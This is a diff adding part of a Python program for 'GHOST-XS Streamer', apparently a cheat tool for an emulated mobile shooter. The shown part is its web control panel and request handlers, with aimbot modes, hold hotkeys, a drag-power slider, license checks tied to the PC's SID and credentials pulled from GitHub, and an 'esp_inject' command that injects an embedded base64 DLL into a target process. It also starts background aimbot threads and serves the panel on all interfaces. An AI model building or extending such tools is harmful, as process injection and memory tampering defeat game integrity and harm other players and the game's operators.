+                                    <option value="Backspace">Backspace</option>
+                                </optgroup>
+                                <optgroup label="Mouse Buttons">
+                                    <option value="MouseLeft">Mouse Left</option><option value="MouseRight">Mouse Right</option>
+                                    <option value="MouseMiddle">Mouse Middle</option><option value="MouseButton4">Mouse Button 4</option>
+                                    <option value="MouseButton5">Mouse Button 5</option>
+                                </optgroup>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Headshot Toggle (Hold)</div>
+                            <div class="note">Hold key for Aimbot Legit</div>
+                        </div>
+                        <div class="row-controls">
+                            <select id="hold-hotkey-selector">
+                                <option value="">None</option>
+                                <optgroup label="Alphabet Keys">
+                                    <option value="A">A</option><option value="B">B</option><option value="C">C</option>
+                                    <option value="D">D</option><option value="E">E</option><option value="F">F</option>
+                                    <option value="G">G</option><option value="H">H</option><option value="I">I</option>
+                                    <option value="J">J</option><option value="K">K</option><option value="L">L</option>
+                                    <option value="M">M</option><option value="N">N</option><option value="O">O</option>
+                                    <option value="P">P</option><option value="Q">Q</option><option value="R">R</option>
+                                    <option value="S">S</option><option value="T">T</option><option value="U">U</option>
+                                    <option value="V">V</option><option value="W">W</option><option value="X">X</option>
+                                    <option value="Y">Y</option><option value="Z">Z</option>
+                                </optgroup>
+                                <optgroup label="Number Keys">
+                                    <option value="0">0</option><option value="1">1</option><option value="2">2</option>
+                                    <option value="3">3</option><option value="4">4</option><option value="5">5</option>
+                                    <option value="6">6</option><option value="7">7</option><option value="8">8</option>
+                                    <option value="9">9</option>
+                                </optgroup>
+                                <optgroup label="Function Keys">
+                                    <option value="F1">F1</option><option value="F2">F2</option><option value="F3">F3</option>
+                                    <option value="F4">F4</option><option value="F5">F5</option><option value="F6">F6</option>
+                                    <option value="F7">F7</option><option value="F8">F8</option><option value="F9">F9</option>
+                                    <option value="F10">F10</option><option value="F11">F11</option><option value="F12">F12</option>
+                                </optgroup>
+                                <optgroup label="Special Keys">
+                                    <option value="Space">Space</option><option value="Enter">Enter</option>
+                                    <option value="Shift">Shift</option><option value="Control">Control</option>
+                                    <option value="Alt">Alt</option><option value="Tab">Tab</option>
+                                    <option value="CapsLock">Caps Lock</option><option value="Escape">Escape</option>
+                                    <option value="Backspace">Backspace</option>
+                                </optgroup>
+                                <optgroup label="Mouse Buttons">
+                                    <option value="MouseLeft">Mouse Left</option><option value="MouseRight">Mouse Right</option>
+                                    <option value="MouseMiddle">Mouse Middle</option><option value="MouseButton4">Mouse Button 4</option>
+                                    <option value="MouseButton5">Mouse Button 5</option>
+                                </optgroup>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Hold Key Delay</div>
+                            <div class="note">Delay before aimbot activates when holding key</div>
+                        </div>
+                        <div class="slider-container">
+                            <div class="slider-label">
+                                <span>Delay:</span>
+                                <span class="slider-value" id="delayValue">50ms</span>
+                            </div>
+                            <input type="range" min="0" max="300" value="50" id="delaySlider">
+                        </div>
+                    </div>
+
+                    <hr>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Log Out</div>
+                            <div class="note">Logs you out of the website.</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn" onclick="logout()">Log Out</div>
+                        </div>
+                    </div>
+
+                    <div class="row">
+                        <div class="row-label">
+                            <div class="title">Exit Application</div>
+                            <div class="note">Closes the GHOST-XS Streamer application</div>
+                        </div>
+                        <div class="row-controls">
+                            <div class="btn btn-danger" onclick="exitApplication()">Exit</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>Console</h2>
+            </div>
+            <div class="card-body">
+                <div class="console" id="console"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="notifications-container"></div>
+
+    <script>
+        const consoleEl = document.getElementById('console');
+        const notificationsContainer = document.getElementById('notifications-container');
+        const hotkeySelector = document.getElementById('hotkey-selector');
+        const holdHotkeySelector = document.getElementById('hold-hotkey-selector');
+        const delaySlider = document.getElementById('delaySlider');
+        const delayValue = document.getElementById('delayValue');
+        const powerSlider = document.getElementById('powerSlider');
+        const powerValue = document.getElementById('powerValue');
+
+        function log(message) {
+            const now = new Date();
+            const time = now.toLocaleTimeString();
+            consoleEl.textContent += `[${time}] ${message}\\n`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+        }
+
+        function showNotification(message) {
+            const notif = document.createElement('div');
+            notif.className = 'notification';
+            notif.textContent = message;
+            notificationsContainer.appendChild(notif);
+            setTimeout(() => {
+                if (notif.parentNode) notif.remove();
+            }, 3000);
+        }
+
+        function updateButtonState(buttonId, isActive) {
+            const btn = document.getElementById(buttonId);
+            if (btn) {
+                if (isActive) {
+                    btn.classList.add('active');
+                } else {
+                    btn.classList.remove('active');
+                }
+            }
+        }
+
+        function sendCommand(command) {
+            if (command === 'aimbotscan') {
+                log('SCANNING WITH ADV METHOD');
+            }
+            
+            if (command === 'aimbotenable') {
+                updateButtonState('neckBtn', true);
+                updateButtonState('defaultBtn', false);
+            } else if (command === 'aimbotdisable') {
+                updateButtonState('neckBtn', false);
+                updateButtonState('defaultBtn', true);
+            } else if (command === 'leftShoulderOn') {
+                updateButtonState('leftEnableBtn', true);
+                updateButtonState('leftDisableBtn', false);
+            } else if (command === 'leftShoulderOff') {
+                updateButtonState('leftEnableBtn', false);
+                updateButtonState('leftDisableBtn', true);
+            } else if (command === 'rightShoulderOn') {
+                updateButtonState('rightEnableBtn', true);
+                updateButtonState('rightDisableBtn', false);
+            } else if (command === 'rightShoulderOff') {
+                updateButtonState('rightEnableBtn', false);
+                updateButtonState('rightDisableBtn', true);
+            } else if (command === 'AimbotAion') {
+                updateButtonState('aiEnableBtn', true);
+                updateButtonState('aiDisableBtn', false);
+            } else if (command === 'AimbotAioff') {
+                updateButtonState('aiEnableBtn', false);
+                updateButtonState('aiDisableBtn', true);
+            }
+            
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.message) {
+                    if (command === 'aimbotscan') {
+                        const lines = data.message.split('\\n');
+                        for (let i = 1; i < lines.length; i++) {
+                            if (lines[i].trim()) log(lines[i]);
+                        }
+                    } else {
+                        log(data.message);
+                    }
+                }
+            })
+            .catch(err => log(`Error: ${err.message}`));
+        }
+
+        function logout() {
+            fetch('/logout', { method: 'POST' }).then(() => {
+                showNotification('Logged out');
+                setTimeout(() => window.location.href = '/', 500);
+            });
+        }
+
+        function exitApplication() {
+            if (confirm('Are you sure you want to exit GHOST-XS Streamer? All features will be disabled.')) {
+                fetch('/exit', { method: 'POST' });
+                showNotification('Application shutting down...');
+                setTimeout(() => window.close(), 1500);
+            }
+        }
+
+        function updateSelectedAimbot() {
+            const selected = document.getElementById('other-aimpos').value;
+            fetch('/update_selected_aimbot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ aimbot: selected }),
+            });
+        }
+
+        function updateHotkeyAimbot() {
+            const selected = document.getElementById('hotkey-aimbot-selector').value;
+            fetch('/update_hotkey_aimbot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ aimbot: selected }),
+            });
+            showNotification(`Hotkey target set to: ${selected}`);
+        }
+
+        function setIgnoreKnocked(ignore) {
+            fetch('/set_ignore_knocked', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ignore_knocked: ignore }),
+            });
+            const status = ignore ? 'Yes' : 'No';
+            log(`Ignore knocked enemies: ${status}`);
+            
+            if (ignore) {
+                updateButtonState('ignoreYesBtn', true);
+                updateButtonState('ignoreNoBtn', false);
+            } else {
+                updateButtonState('ignoreYesBtn', false);
+                updateButtonState('ignoreNoBtn', true);
+            }
+        }
+
+        function saveHotkey(key) {
+            fetch('/save_hotkey', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hotkey: key }),
+            });
+        }
+
+        function saveHoldHotkey(key) {
+            fetch('/save_hold_hotkey', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hotkey: key }),
+            });
+        }
+
+        function saveHoldDelay(delay) {
+            fetch('/save_hold_delay', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ delay: delay }),
+            });
+        }
+
+        function updateHDPlayerStatus() {
+            fetch('/get_hd_player_status')
+                .then(r => r.json())
+                .then(data => {
+                    const badge = document.getElementById('statusBadge');
+                    const statusText = document.getElementById('statusText');
+                    const currentProcessText = document.getElementById('currentProcessText');
+                    const altSection = document.getElementById('alternative-process-section');
+                    
+                    if (data.is_running) {
+                        badge.textContent = 'Online';
+                        badge.className = 'badge online';
+                        statusText.textContent = 'Connected to Streamer';
+                        currentProcessText.textContent = `Process: ${data.current_process}`;
+                        altSection.classList.add('hidden');
+                    } else {
+                        badge.textContent = 'Offline';
+                        badge.className = 'badge offline';
+                        statusText.textContent = 'Server Offline';
+                        currentProcessText.textContent = `Process: ${data.current_process}`;
+                        altSection.classList.remove('hidden');
+                    }
+                });
+        }
+
+        function updateProcessList() {
+            fetch('/get_processes')
+                .then(r => r.json())
+                .then(data => {
+                    const selector = document.getElementById('process-selector');
+                    if (selector && data.success) {
+                        selector.innerHTML = '<option value="">Select a process...</option>';
+                        data.processes.forEach(proc => {
+                            const opt = document.createElement('option');
+                            opt.value = proc.name;
+                            opt.textContent = `${proc.name} (PID: ${proc.pid})`;
+                            selector.appendChild(opt);
+                        });
+                        showNotification('Process list updated');
+                    }
+                });
+        }
+
+        function setTargetProcess() {
+            const selector = document.getElementById('process-selector');
+            const selected = selector.value;
+            if (!selected) {
+                showNotification('Please select a process first');
+                return;
+            }
+            fetch('/set_target_process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ process_name: selected }),
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    showNotification(`Target process set to: ${selected}`);
+                    document.getElementById('currentProcessText').textContent = `Process: ${selected}`;
+                    updateHDPlayerStatus();
+                }
+            });
+        }
+
+        function saveScopeHotkey(key) {
+            fetch('/save_scope_hotkey', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hotkey: key }),
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            updateHDPlayerStatus();
+            setInterval(updateHDPlayerStatus, 3000);
+            updateProcessList();
+
+            fetch('/get_hold_hotkey').then(r => r.json()).then(data => {
+                if (data.success && data.hotkey) holdHotkeySelector.value = data.hotkey;
+            });
+            fetch('/get_hotkey_aimbot').then(r => r.json()).then(data => {
+                if (data.success && data.aimbot) document.getElementById('hotkey-aimbot-selector').value = data.aimbot;
+            });
+            fetch('/get_drag_power').then(r => r.json()).then(data => {
+                if (data.success && powerSlider) {
+                    powerSlider.value = data.power;
+                    powerValue.textContent = data.power + '%';
+                }
+            });
+            fetch('/get_scope_hotkey').then(r => r.json()).then(data => {
+                if (data.success && data.hotkey) document.getElementById('scope-hotkey-selector').value = data.hotkey;
+            });
+
+            hotkeySelector.addEventListener('change', () => {
+                const key = hotkeySelector.value;
+                if (key) { saveHotkey(key); log(`Hotkey set to: ${key}`); showNotification(`Hotkey set to: ${key}`); }
+                else { saveHotkey(''); log('Hotkey cleared'); showNotification('Hotkey cleared'); }
+            });
+
+            holdHotkeySelector.addEventListener('change', () => {
+                const key = holdHotkeySelector.value;
+                if (key) { saveHoldHotkey(key); log(`Hold hotkey set to: ${key}`); showNotification(`Hold hotkey set to: ${key}`); }
+                else { saveHoldHotkey(''); log('Hold hotkey cleared'); showNotification('Hold hotkey cleared'); }
+            });
+
+            delaySlider.addEventListener('input', () => {
+                const delay = parseInt(delaySlider.value);
+                delayValue.textContent = delay + 'ms';
+                saveHoldDelay(delay);
+            });
+
+            delaySlider.addEventListener('change', () => {
+                const delay = parseInt(delaySlider.value);
+                log(`Hold key delay set to: ${delay}ms`);
+                showNotification(`Hold key delay set to: ${delay}ms`);
+            });
+
+            powerSlider.addEventListener('input', () => {
+                const power = parseInt(powerSlider.value);
+                powerValue.textContent = power + '%';
+                fetch('/set_drag_power', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ power: power }),
+                });
+            });
+
+            document.getElementById('scope-hotkey-selector').addEventListener('change', () => {
+                const key = document.getElementById('scope-hotkey-selector').value;
+                if (key) { saveScopeHotkey(key); log(`Scope hotkey set to: ${key}`); showNotification(`Scope hotkey set to: ${key}`); }
+                else { saveScopeHotkey(''); log('Scope hotkey cleared'); showNotification('Scope hotkey cleared'); }
+            });
+
+            const otherSelect = document.getElementById('other-aimpos');
+            const leftShoulder = document.querySelector('.leftShoulder');
+            const rightShoulder = document.querySelector('.rightShoulder');
+            const aiAimbot = document.querySelector('.Aiaimbot');
+            const powerContainer = document.getElementById('power-slider-container');
+            
+            otherSelect.addEventListener('change', () => {
+                const val = otherSelect.value;
+                leftShoulder.classList.add('hidden');
+                rightShoulder.classList.add('hidden');
+                aiAimbot.classList.add('hidden');
+                powerContainer.classList.add('hidden');
+                
+                if (val === 'LeftShoulder') {
+                    leftShoulder.classList.remove('hidden');
+                    powerContainer.classList.remove('hidden');
+                } else if (val === 'RightShoulder') {
+                    rightShoulder.classList.remove('hidden');
+                    powerContainer.classList.remove('hidden');
+                } else if (val === 'AimbotAi') {
+                    aiAimbot.classList.remove('hidden');
+                }
+            });
+
+            const tabs = document.querySelectorAll('.tab');
+            const panels = document.querySelectorAll('.content-panel');
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const target = tab.getAttribute('data-tab');
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tab.classList.add('active');
+                    panels.forEach(p => p.classList.remove('active'));
+                    document.getElementById(target).classList.add('active');
+                });
+            });
+        });
+    </script>
+</body>
+</html>"""
+        self.wfile.write(html.encode())
+    
+    def send_process_status(self):
+        self.send_json({'is_running': is_process_running(current_target_process), 'current_process': current_target_process})
+    
+    def send_process_list(self):
+        self.send_json({'success': True, 'processes': get_running_processes()})
+    
+    def send_hotkey_aimbot(self):
+        self.send_json({'success': True, 'aimbot': hotkey_state["selected_aimbot"]})
+    
+    def send_hold_hotkey(self):
+        self.send_json({'success': True, 'hotkey': hotkey_state["hold_key"] or ''})
+    
+    def send_scope_hotkey(self):
+        self.send_json({'success': True, 'hotkey': ''})
+    
+    def send_drag_power(self):
+        self.send_json({'success': True, 'power': drag_power})
+    
+    def handle_login(self, data):
+        u,p = data.get('username',''), data.get('password','')
+        creds = fetch_credentials()
+        sid = get_computer_sid()
+        if u in creds and creds[u][0]==p and creds[u][1]==sid:
+            authenticated_users[self.client_address[0]] = time.time()
+            self.send_json({'success': True})
+        else:
+            self.send_json({'success': False})
+    
+    def handle_execute(self, data):
+        cmd = data.get('command','')
+        result = "OK"
+        
+        if cmd == "aimbotscan":
+            result = HEADLOAD()
+        elif cmd == "aimbotenable":
+            result = ENABLE_NECK()
+        elif cmd == "aimbotdisable":
+            result = AIMBOT_OFF()
+        elif cmd == "leftShoulderOn":
+            result = leftShoulderOn()
+        elif cmd == "leftShoulderOff":
+            result = leftShoulderOff()
+        elif cmd == "rightShoulderOn":
+            result = rightShoulderOn()
+        elif cmd == "rightShoulderOff":
+            result = rightShoulderOff()
+        elif cmd == "AimbotAion":
+            result = AimbotAion()
+        elif cmd == "AimbotAioff":
+            result = AimbotAioff()
+        elif cmd == "loadsniper":
+            result = "Sniper loaded"
+        elif cmd == "sniperscopeenable":
+            result = "Scope enabled"
+        elif cmd == "sniperscopedisable":
+            result = "Scope disabled"
+        elif cmd == "sniperswitchenable":
+            result = "Switch enabled"
+        elif cmd == "sniperswitchdisable":
+            result = "Switch disabled"
+        elif cmd == "esp_inject":
+            result = extract_and_inject_dll(current_target_process)
+        elif cmd == "set_emulator_msi":
+            result = "Emulator: MSI"
+        elif cmd == "set_emulator_bluestacks":
+            result = "Emulator: Bluestacks"
+        elif cmd == "ignoreknocked_yes":
+            result = "Ignore knocked: Yes"
+        elif cmd == "ignoreknocked_no":
+            result = "Ignore knocked: No"
+        
+        self.send_json({'success': True, 'message': result})
+    
+    def save_hotkey(self, data):
+        self.send_json({'success': True})
+    
+    def save_hold_hotkey(self, data):
+        hotkey_state["hold_key"] = data.get('hotkey','') or None
+        self.send_json({'success': True})
+    
+    def save_hold_delay(self, data):
+        hotkey_state["delay"] = data.get('delay', 50)
+        self.send_json({'success': True})
+    
+    def save_scope_hotkey(self, data):
+        self.send_json({'success': True})
+    
+    def set_drag_power(self, data):
+        power = data.get('power', 50)
+        result = set_drag_power(power)
+        self.send_json({'success': True, 'message': result})
+    
+    def update_hotkey_aimbot(self, data):
+        hotkey_state["selected_aimbot"] = data.get('aimbot','Head')
+        self.send_json({'success': True})
+    
+    def update_selected_aimbot(self, data):
+        self.send_json({'success': True})
+    
+    def set_target_process(self, data):
+        global current_target_process
+        p = data.get('process_name','')
+        if p:
+            current_target_process = p
+            self.send_json({'success': True})
+        else:
+            self.send_json({'success': False})
+    
+    def set_ignore_knocked(self, data):
+        self.send_json({'success': True})
+    
+    def handle_logout(self):
+        if self.client_address[0] in authenticated_users:
+            del authenticated_users[self.client_address[0]]
+        self.send_json({'success': True})
+    
+    def handle_exit(self):
+        self.send_json({'success': True})
+        threading.Timer(1.0, self.server.shutdown).start()
+    
+    def send_json(self, data):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
+    
+    def log_message(self, *args): pass
+
+# ==================== MAIN ====================
+if __name__ == "__main__":
+    print("=" * 60)
+    print("     GHOST-XS STREAMER - FINAL")
+    print("=" * 60)
+    print(f"[*] PC SID: {get_computer_sid()}")
+    print(f"[*] GitHub users: {len(fetch_credentials())}")
+    print(f"[*] PyMem: {'OK' if PYMEM_OK else 'FAILED'}")
+    print(f"[*] Embedded DLL: {'Found' if EMBEDDED_DLL_BASE64 and EMBEDDED_DLL_BASE64.strip() != 'PASTE_YOUR_BASE64_ENCODED_DLL_HERE' else 'Not found - add your DLL base64'}")
+    
+    threading.Thread(target=aimbot_loop, daemon=True).start()
+    threading.Thread(target=collider_loop, daemon=True).start()
+    threading.Thread(target=hold_hotkey_monitor, daemon=True).start()
+    threading.Thread(target=drag_detection_loop, daemon=True).start()
+    
+    server = HTTPServer(('0.0.0.0', 8080), GhostWebServer)
+    ip = socket.gethostbyname(socket.gethostname())
+    
+    print("\n" + "=" * 60)
+    print(f"URL: http://{ip}:8080")
+    print(f"Target Process: {current_target_process}")
+    print(f"Delay: {hotkey_state['delay']}ms")
+    print(f"Mouse Keys: Left, Right, Middle, X1, X2")
+    print(f"Drag Power: 0-100% (maps to 0-50 pixels)")
+    print("=" * 60)
+    print("SCAN ONLY - No auto activation")
+    print("=" * 60)
+    print("Press Ctrl+C to stop")
+    print("=" * 60)
+    
+    try:
+        server.serve_forever()
+    except KeyboardInterrupt:
+        print("\nShutting down...")
+        server.shutdown()
+        try:
+            os.system("taskkill /f /im pythonw.exe >nul 2>&1")
+        except:
+            pass
